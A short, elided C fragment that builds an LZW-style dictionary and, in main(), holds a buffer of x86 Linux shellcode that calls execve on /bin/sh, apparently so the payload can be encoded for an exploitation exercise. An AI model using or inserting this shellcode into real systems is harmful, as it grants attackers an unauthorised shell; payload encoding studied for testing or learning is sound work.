...
void init_dictionary(Dicionary* dict,int max_size){
	...
	char lowcharseq[2] = "a";
	for (int i = 0; i < 26; i++){
		insert_seq(dict, lowcharseq);
		lowcharseq[0]++;
	}
	char intseq[2] = "0";
	for (int i = 0; i < 10; i++){
		insert_seq(dict,intseq);
		intseq[0]++;
	}
	insert_seq(dict,"/");
	insert_seq(dict, "\\");
...
int main(){
	...
	char buffer[] = "jhh///sh/bin\\x89\\xe3h\\x01\\x01\\x01\\x01\\x814$ri\\x01\\x011\\xc9Qj\\x04Y\\x01\\xe1Q\\x89\\xe11\\xd2j\\x0bX\\xcd\\x80";
	int output[1000];
